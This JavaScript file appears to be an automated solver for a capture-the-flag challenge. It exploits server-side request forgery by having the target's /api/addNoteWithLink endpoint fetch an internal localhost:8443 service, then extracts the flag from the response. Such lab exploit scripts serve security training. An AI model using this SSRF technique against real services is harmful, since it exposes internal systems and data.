/**
 * Challenge: 0xa7 - Server-Side Request Forgery
 * Exploit: SSRF via /api/addNoteWithLink to http://localhost:8443
 */

const { createLogger, httpRequest, extractFlag } = require('../utils');

async function run(token, baseUrl, testUser, testPass) {
    const { log, saveFlag } = createLogger('0xa7');
    log('Starting 0xa7 exploit: Server-Side Request Forgery');

    // The internal server runs on port 8443 and returns the flag
    const ssrfUrl = 'http://localhost:8443';

    log(`Attempting SSRF to internal server at ${ssrfUrl}...`);
    const result = await httpRequest(`${baseUrl}/api/addNoteWithLink`, {
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({
            url: ssrfUrl,
        }),
    });

    log(`SSRF response: ${JSON.stringify(result.data)}`);

    // Check if flag is in response
    let flag = extractFlag(JSON.stringify(result.data));
    if (flag) {
        saveFlag(flag);
        return { success: true, flag };
    }

    // The flag might be in the note field
    if (result.data && result.data.note) {
        flag = extractFlag(result.data.note);
        if (flag) {
            log(`✅ FLAG FOUND in note: ${flag}`);
            saveFlag(flag);
            return { success: true, flag };
        }
        log('✅ SSRF successful - server made request to internal resource');
        log(`Note content: ${result.data.note}`);
        return { success: true };
    }

    log('❌ SSRF may have failed');
    return { success: false };
}

module.exports = { run };
